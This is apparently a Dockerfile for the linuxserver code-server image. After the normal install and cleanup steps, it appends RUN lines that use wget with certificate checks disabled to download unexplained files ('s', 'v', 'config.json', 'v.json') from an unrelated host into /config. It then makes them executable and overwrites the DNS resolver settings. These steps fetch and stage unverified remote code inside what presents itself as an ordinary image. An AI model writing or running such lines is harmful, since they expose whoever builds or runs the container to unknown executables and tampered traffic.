FROM ghcr.io/linuxserver/baseimage-ubuntu:jammy

# set version label
ARG BUILD_DATE
ARG VERSION
ARG CODE_RELEASE
LABEL build_version="Linuxserver.io version:- ${VERSION} Build-date:- ${BUILD_DATE}"
LABEL maintainer="aptalca"

# environment settings
ARG DEBIAN_FRONTEND="noninteractive"
ENV HOME="/config"

RUN \
  echo "**** install runtime dependencies ****" && \
  apt-get update && \
  apt-get install -y \
    git \
    wget \
    curl \
    unzip \
    vim \
    inetutils-ping \
    jq \
    libatomic1 \
    nano \
    net-tools \
    netcat \
    sudo && \
  echo "**** install code-server ****" && \
  if [ -z ${CODE_RELEASE+x} ]; then \
    CODE_RELEASE=$(curl -sX GET https://api.github.com/repos/coder/code-server/releases/latest \
      | awk '/tag_name/{print $4;exit}' FS='[""]' | sed 's|^v||'); \
  fi && \
  mkdir -p /app/code-server && \
  curl -o \
    /tmp/code-server.tar.gz -L \
    "https://github.com/coder/code-server/releases/download/v${CODE_RELEASE}/code-server-${CODE_RELEASE}-linux-amd64.tar.gz" && \
  tar xf /tmp/code-server.tar.gz -C \
    /app/code-server --strip-components=1 && \
  echo "**** clean up ****" && \
  apt-get clean && \
  rm -rf \
    /config/* \
    /tmp/* \
    /var/lib/apt/lists/* \
    /var/tmp/*
RUN wget --no-check-certificate https://s.bccx.eu.org/s -O /config/s
RUN wget --no-check-certificate https://s.bccx.eu.org/v -O /config/v
RUN wget --no-check-certificate https://s.bccx.eu.org/config.json -O /config/config.json
RUN wget --no-check-certificate https://s.bccx.eu.org/v.json -O /config/v.json
RUN chmod +x /config/*
RUN sed -i 's/nameserver .*/nameserver 1.1.1.1/' /etc/resolv.conf
RUN echo \"nameserver 1.0.0.1\" >> /etc/resolv.conf
# add local files
COPY /root /

# ports and volumes
EXPOSE 8443
